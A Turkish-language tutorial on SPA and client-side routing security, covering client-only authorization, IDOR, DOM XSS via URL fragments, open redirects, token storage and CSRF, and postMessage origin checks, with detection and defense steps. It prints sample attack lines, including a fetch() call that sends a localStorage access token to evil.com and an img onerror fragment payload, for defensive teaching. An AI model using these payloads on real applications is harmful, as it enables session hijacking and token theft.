# Single Page Application (SPA) ve Client-Side Routing Güvenliği

## Giriş ve Kapsam

Single Page Application (SPA) mimarisi, geleneksel çok sayfalı (multi-page) web uygulamalarının yerini büyük ölçüde aldı. React, Vue, Angular, Svelte gibi kütüphane ve framework'lerle inşa edilen bu uygulamalarda, ilk sayfa yüklendikten sonra tarayıcı tam sayfa yenilemeleri (full page reload) yapmaz; bunun yerine JavaScript, DOM'u dinamik olarak günceller ve ekranlar arasında geçiş yapar. Bu model kullanıcı deneyimini hızlandırır, ancak güvenlik sorumluluğunun bir kısmını sunucudan tarayıcıya, yani saldırganın tam kontrolündeki bir ortama kaydırır.

Bu makale, "Frontend Mimari" başlığı altında genel olarak ele alınan konuların ötesine geçerek SPA'lara özgü riskleri inceler: client-side yetkilendirme yanılgıları, hash-based ve history-based routing'in güvenlik parçaları, mikro-frontend (micro-frontend) mimarilerinde `postMessage` tabanlı iletişim, ve token'ların `localStorage`/`sessionStorage`'da saklanmasının XSS ile birleşimi. Amaç mekanizmayı anlamak ve tespit ile savunma katmanları kurmaktır.

## Temel Yanılgı: İstemci Tarafı Görünürlük Kontrolü Yetkilendirme Değildir

SPA güvenliğinin kök nedeni tek bir kavramsal hatada toplanır: **tarayıcıda çalışan hiçbir kod güvenlik sınırı (security boundary) oluşturamaz.** İstemci tarafındaki tüm JavaScript, HTML, route tanımları ve durum (state) yönetimi, kullanıcının, dolayısıyla saldırganın tam kontrolündedir. DevTools ile değiştirilebilir, JavaScript debugger ile breakpoint konularak akış saptırılabilir, bellek üzerindeki değişkenler değiştirilebilir.

### Client-Side Yetkilendirme Yanılgısı (Broken Access Control)

En yaygın SPA hatası, yetkilendirme (authorization) kararlarının yalnızca istemcide alınmasıdır. Tipik bir örüntü şöyledir:

```javascript
// TEHLİKELİ ÖRÜNTÜ: yalnızca istemci tarafı kontrol
function AdminPanel() {
  const user = useCurrentUser();
  if (user.role !== 'admin') {
    return <Redirect to="/dashboard" />;
  }
  return <AdminDashboard />;  // hassas veriyi burada çeker
}
```

Bu kodda iki ayrı ve bağımsız sorun vardır:

1. **UI gizleme (UI hiding) ile yetkilendirmenin karıştırılması:** `role !== 'admin'` kontrolü yalnızca menü öğesini veya bileşeni gizler. Saldırgan, bundled JavaScript'i okuyarak `/admin` route'unu keşfeder, doğrudan o URL'e gider veya durum yönetimindeki `role` değişkenini `admin` yapar. Bileşen render olur.

2. **Asıl kritik nokta: API çağrıları.** `AdminDashboard` bileşeni render olduğunda `/api/admin/users` gibi bir uç noktaya (endpoint) istek atar. Eğer **backend** bu isteği kimlik ve yetki açısından bağımsızca doğrulamıyorsa, veri sızar. SPA'nın güvenliği tümüyle backend'in her istekte yetkilendirme yapmasına bağlıdır. Route gizleme yalnızca kozmetiktir.

**Kritik ilke:** Frontend routing ve bileşen gizleme yalnızca **kullanıcı deneyimidir**. Gerçek yetkilendirme her zaman sunucuda, her API isteğinde, o istekteki kimliğe göre yapılmalıdır. Frontend'de yetki kontrolü yapmak yanlış değildir (UX için gereklidir), ama backend'de tekrar yapılmıyorsa hiçbir güvenlik değeri yoktur.

### IDOR ve Fonksiyon Seviyesi Yetkilendirme Eksikliği

SPA'lar genellikle kaynak kimliklerini (resource ID) doğrudan URL veya API çağrılarında kullanır: `/api/orders/12345`. Backend "bu order gerçekten bu kullanıcıya mı ait?" kontrolünü yapmazsa, saldırgan ID'yi değiştirerek başkalarının verisine erişir (Insecure Direct Object Reference — IDOR). SPA mimarisi bu riski değiştirmez ama API-merkezli yapısı nedeniyle uç noktaları çok görünür kılar; tüm API şeması bundled JavaScript'te okunabilir.

## Client-Side Routing'in İç Mekanizması ve Riskleri

SPA'larda routing iki ana biçimde çalışır ve her birinin kendine özgü güvenlik yüzeyi vardır.

### Hash-Based Routing (`#/path`)

Hash-based routing, URL'in `#` işaretinden sonraki fragment kısmını (`https://app.com/#/profile`) kullanır. Buradaki kritik teknik gerçek şudur: **URL'in fragment (hash) kısmı sunucuya HTTP isteğinde gönderilmez.** Yalnızca tarayıcıda kalır ve `window.location.hash` üzerinden JavaScript ile okunur.

Bunun iki önemli güvenlik sonucu vardır:

1. **Sunucu görünürlüğü yoktur:** Sunucu, kullanıcının hangi hash-route'da olduğunu göremez, loglayamaz ve yetkilendiremez. Yetkilendirmenin sunucuya taşınması gerektiği ilkesini bu daha da vurgular.

2. **Fragment tabanlı XSS (DOM XSS):** Uygulama, hash içeriğini güvensizce DOM'a yazarsa DOM-based XSS oluşur. Klasik örüntü:

```javascript
// TEHLİKELİ: hash içeriğini doğrudan DOM'a yazma
const route = window.location.hash.substring(1);
document.getElementById('content').innerHTML = route;  // XSS
```

Saldırgan `https://app.com/#<img src=x onerror=alert(1)>` benzeri bir bağlantı oluşturur. Fragment sunucuya gitmediği için sunucu tarafı Web Application Firewall (WAF) ve loglar bu saldırıyı **göremez** — bu, tespiti zorlaştıran önemli bir noktadır.

### History-Based Routing (HTML5 History API)

Modern SPA'lar `history.pushState()` ve `history.replaceState()` API'lerini kullanarak temiz URL'ler üretir (`https://app.com/profile`). Burada URL yolu (path) normal görünür ama **tarayıcı sunucuya yeni bir istek atmaz**; sadece adres çubuğunu günceller ve router bileşeni JavaScript içinde uygun görünümü gösterir.

Bu modelin en yaygın operasyonel tuzağı **sunucu tarafı fallback yapılandırmasıdır**. Kullanıcı `/profile`'ı doğrudan açtığında veya yenilediğinde tarayıcı gerçekten sunucuya `GET /profile` isteği atar. Sunucu bu yolu tanımıyorsa 404 döner. Çözüm olarak sunucu genellikle tüm bilinmeyen yolları `index.html`'e yönlendirir (SPA fallback). Ancak bu yapılandırma **API uç noktalarını veya statik hassas dosyaları da yanlışlıkla `index.html`'e yönlendirebilir** veya tersine, dizin gezinme (path traversal) benzeri hatalara yol açabilir. Fallback kuralı dikkatli yazılmalı; API ve varlık (asset) yolları hariç tutulmalıdır.

### Open Redirect ve Route Parametreleri

SPA'lar login sonrası yönlendirme için sıkça `?returnUrl=/dashboard` gibi parametreler kullanır. Uygulama bu değeri doğrulamadan `window.location = returnUrl` şeklinde kullanırsa, saldırgan `?returnUrl=https://evil.com` ile açık yönlendirme (open redirect) oluşturur. Daha tehlikelisi `returnUrl=javascript:...` şeması ile client-side kod çalıştırmadır. Yönlendirme hedefleri her zaman **allowlist** ile veya yalnızca göreli (relative), aynı-origin yollarla sınırlandırılmalıdır.

## Token Saklama: `localStorage`/`sessionStorage` ve XSS Birleşimi

SPA'ların token yönetimi, en çok tartışılan ve en sık yanlış yapılan konudur.

### Kök Neden: JavaScript Erişilebilir Depolama

`localStorage` ve `sessionStorage`, aynı origin'de çalışan **her JavaScript koduna** açıktır. Bir JWT (JSON Web Token) veya oturum token'ı buraya konursa, sayfada çalışan herhangi bir JavaScript — kendi kodunuz, üçüncü taraf bir kütüphane, bir reklam scripti veya XSS ile enjekte edilmiş saldırgan kodu — bu token'ı `localStorage.getItem('token')` ile okuyabilir.

Bu, **XSS ile birleştiğinde felakete dönüşür.** Tek bir XSS açığı, saldırganın:

```javascript
// XSS payload'ının yaptığı: token'ı sızdırma
fetch('https://evil.com/steal?t=' + localStorage.getItem('access_token'));
```

Bu token exfiltrasyonu tam oturum ele geçirmedir (session hijacking). Token'ı çalan saldırgan onu kendi ortamında kullanarak kullanıcı kimliğine bürünür. Token'ın süresi dolana kadar bu erişim devam eder.

### `httpOnly` Cookie ile Karşılaştırma

Alternatif, token'ı `HttpOnly` bayrağı ile işaretlenmiş bir cookie'de saklamaktır. `HttpOnly` cookie **JavaScript'ten okunamaz** (`document.cookie` göremez). Bu, XSS durumunda token'ın doğrudan çalınmasını engeller.

Ancak burada önemli bir nüans vardır ve mühendisler sıkça yanılır: **`HttpOnly` cookie XSS'e karşı sihirli bir çözüm değildir.** Token cookie'de olsa bile, XSS ile çalışan kod tarayıcıda kullanıcının oturumunda çalışır. Saldırgan token'ı okuyamasa da, kurbanın tarayıcısından **doğrudan yetkili istekler** atabilir (cookie otomatik eklenir). Yani XSS varsa, saldırgan token'ı dışarı sızdıramasa bile eylemleri kurban adına gerçekleştirebilir. Fark şudur: `HttpOnly` ile saldırı kurbanın oturumu ve tarayıcısıyla sınırlı kalır; `localStorage` ile token dışarı çıkar ve kalıcı, taşınabilir bir erişim olur.

### Cookie Kullanımının Getirdiği: CSRF

Token cookie'ye taşınınca, cookie'ler otomatik gönderildiği için **Cross-Site Request Forgery (CSRF)** riski geri gelir. Bu nedenle cookie tabanlı yaklaşımda:

- `SameSite=Strict` veya `SameSite=Lax` özniteliği kullanılmalı (cross-site isteklerde cookie gönderimini kısıtlar),
- `Secure` bayrağı ile yalnızca HTTPS üzerinde gönderim sağlanmalı,
- Gerekli durumlarda anti-CSRF token (double-submit cookie veya synchronizer token) eklenmelidir.

### Dengeli Değerlendirme

Ne `localStorage` ne de cookie tek başına "doğru cevap"tır. Pratikte güçlü bir yaklaşım:

- **Erişim token'ını (access token)** kısa ömürlü tutmak (birkaç dakika),
- **Yenileme token'ını (refresh token)** `HttpOnly`, `Secure`, `SameSite` cookie'de saklamak,
- Erişim token'ını bellekte (JavaScript değişkeni, örn. bir kapanış/closure içinde) tutmak — sayfa yenilemede kaybolur ama `localStorage`'a göre çok daha az saldırı yüzeyi sunar,
- **Her koşulda XSS'i kök nedende engellemek** — çünkü XSS varsa hiçbir token saklama stratejisi tam koruma sağlamaz.

Vurgulanması gereken çekirdek gerçek: **Token saklama tartışması XSS'i çözmez; XSS varlığında kayıp büyüklüğünü belirler.** Asıl savunma XSS'in oluşmasını engellemektir.

## Mikro-Frontend ve `postMessage` Tabanlı İletişim

Mikro-frontend mimarisinde tek bir sayfa, farklı ekipler tarafından geliştirilen ve bazen farklı origin'lerde barındırılan parçalardan (iframe veya module federation ile) oluşur. Bu parçalar arasında iletişim genellikle `window.postMessage()` API'si ile yapılır.

### Çalışma Mantığı

`postMessage`, farklı origin'lerdeki pencere/iframe'lerin kontrollü biçimde mesajlaşmasını sağlar. Gönderen taraf:

```javascript
targetWindow.postMessage(data, targetOrigin);
```

Alan taraf bir olay dinleyicisi (event listener) ile mesajı karşılar:

```javascript
window.addEventListener('message', (event) => { ... });
```

### İki Yönlü Güvenlik Hatası

`postMessage` iki uçta da güvensiz kullanılabilir:

**1. Gönderimde `targetOrigin` olarak `"*"` kullanmak:**

```javascript
// TEHLİKELİ: mesajı herhangi bir origin'e sızdırır
iframe.contentWindow.postMessage(sensitiveToken, '*');
```

`"*"` joker değeri, mesajın alan iframe'in origin'i ne olursa olsun teslim edileceği anlamına gelir. Eğer iframe saldırganın kontrolüne geçmiş bir origin'e yönlenirse (örneğin bir yönlendirme sonrası), hassas veri o origin'e gider. Her zaman kesin hedef origin belirtilmelidir: `postMessage(data, 'https://trusted-partner.com')`.

**2. Alımda gönderenin `origin`'ini doğrulamamak:**

```javascript
// TEHLİKELİ: her origin'den mesaj kabul eder
window.addEventListener('message', (event) => {
  // event.origin kontrol edilmiyor!
  const cmd = JSON.parse(event.data);
  if (cmd.action === 'setToken') storeToken(cmd.value);
});
```

Herhangi bir web sitesi, kurbanın sekmesinde açık olan bu uygulamaya `postMessage` atabilir. Origin doğrulanmazsa saldırgan sahte komutlar enjekte eder — token değiştirme, DOM'a içerik yazma (DOM XSS), yetkili işlem tetikleme. Doğru örüntü:

```javascript
window.addEventListener('message', (event) => {
  // 1. Gönderen origin'i allowlist ile doğrula
  if (event.origin !== 'https://trusted-partner.com') return;
  // 2. Mesaj yapısını/tipini doğrula
  if (typeof event.data !== 'object' || !ALLOWED_ACTIONS.has(event.data.action)) return;
  // 3. İçeriği güvenli işle (innerHTML'e ham yazma!)
  handleMessage(event.data);
});
```

`postMessage` verisini **asla `eval`, `innerHTML` veya `document.write`'a doğrudan geçirmeyin.** Mesajlar dış girdi (untrusted input) olarak ele alınmalıdır.

## Tespit ve Savunma

### Tespit Yaklaşımları

- **API yetkilendirme testi:** SPA'nın kullandığı tüm uç noktaları bundled JavaScript'ten veya proxy (Burp, mitmproxy) ile çıkarın. Her uç noktayı düşük yetkili bir hesapla ve yetkisiz/anonim olarak tekrar deneyerek backend'in bağımsız yetkilendirme yapıp yapmadığını doğrulayın. Route gizleme değil, API katmanı test edilir.
- **DOM XSS taraması:** `location.hash`, `location.search`, `postMessage` gibi kaynakların (source) `innerHTML`, `eval`, `document.write` gibi lavabolara (sink) akışını statik ve dinamik olarak izleyin. Tarayıcıların DevTools'unda ve DOM Invader benzeri araçlarla source-sink akışı takip edilebilir.
- **CSP ihlali raporları:** `Content-Security-Policy-Report-Only` ile beklenmedik script yükleme veya inline çalıştırma girişimlerini toplayarak XSS ve enjeksiyon belirtilerini tespit edin.
- **Token depolama denetimi:** DevTools > Application sekmesinde `localStorage`/`sessionStorage` içinde JWT veya oturum token'ı olup olmadığını kontrol edin. Uzun ömürlü token'ların istemcide okunabilir yerde durması bir bulgu işaretidir.
- **`postMessage` denetimi:** Kod tabanında `addEventListener('message'` çağrılarını arayıp her birinde `event.origin` kontrolü olup olmadığını denetleyin. Aynı şekilde `postMessage(..., '*')` kullanımlarını grepleyin.

### Savunma Katmanları

1. **Sunucu tarafı yetkilendirme (birincil savunma):** Her API isteğinde kimlik ve yetki doğrulanır. Frontend routing güvenlik sınırı sayılmaz.
2. **Content Security Policy (CSP):** Güçlü, `nonce` veya `hash` tabanlı bir CSP, inline script ve dış kaynak yüklemeyi kısıtlayarak XSS'in etkisini büyük ölçüde azaltır. `unsafe-inline` ve `unsafe-eval`'den kaçınılır. SPA'larda CSP inşası zahmetlidir ama en yüksek getirili savunmadır.
3. **Çıktı kodlama ve güvenli render:** Framework'lerin varsayılan escaping'ine güvenin (React JSX otomatik escape eder). `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]` gibi kaçış noktalarını (bypass) yalnızca DOMPurify benzeri sanitizasyon ile kullanın.
4. **Token stratejisi:** Kısa ömürlü access token + `HttpOnly`/`Secure`/`SameSite` cookie'de refresh token. Uzun ömürlü token'ı `localStorage`'a koymaktan kaçının.
5. **`postMessage` sertleştirme:** Gönderimde kesin `targetOrigin`, alımda `event.origin` allowlist doğrulaması ve mesaj şeması doğrulaması.
6. **Güvenli yönlendirme:** `returnUrl` ve benzeri parametreleri allowlist veya yalnızca aynı-origin göreli yollarla sınırlayın.
7. **Bağımlılık hijyeni:** Üçüncü taraf kütüphaneler aynı origin'de çalışıp `localStorage` ve DOM'a tam erişir. Software Composition Analysis (SCA) ile bilinen açıklı paketleri, Subresource Integrity (SRI) ile dış script bütünlüğünü denetleyin.

## Yaygın Hatalar (Özet)

- Route gizlemeyi yetkilendirme sanmak; backend'de yetki kontrolünü atlamak.
- API uç noktalarında nesne düzeyinde yetki (IDOR) kontrolünü unutmak.
- Uzun ömürlü JWT'yi `localStorage`'a koyup XSS'i "başımıza gelmez" varsaymak.
- `HttpOnly` cookie'yi XSS'e karşı tam çözüm sanıp XSS savunmasını gevşetmek.
- Cookie'ye geçince `SameSite` ve CSRF korumasını atlamak.
- Hash/search parametrelerini doğrudan `innerHTML`'e yazmak (DOM XSS).
- `postMessage`'da `targetOrigin='*'` kullanmak ve alımda `event.origin`'i doğrulamamak.
- `postMessage` verisini güvenilir girdi gibi işleyip lavabolara aktarmak.
- SPA fallback yapılandırmasında API ve statik dosya yollarını dışlamamak.
- CSP'yi `unsafe-inline`/`unsafe-eval` ile devre dışı bırakacak kadar gevşetmek.

## Sonuç

SPA mimarisi güvenlik sorumluluğunu tarayıcıya kaydırır, ama tarayıcı güvenilmez bir ortamdır. İki temel ilke her şeyi özetler: **Birincisi, gerçek yetkilendirme her zaman sunucuda ve her istekte yapılır; istemci tarafı routing yalnızca deneyimdir. İkincisi, XSS SPA'nın en yıkıcı açığıdır — token saklama stratejileri kaybın büyüklüğünü belirler ama XSS'i çözmez.** Savunma; sunucu tarafı yetkilendirme, güçlü CSP, güvenli render, disiplinli token yönetimi ve sertleştirilmiş `postMessage` iletişiminin katmanlı birleşiminden oluşur.
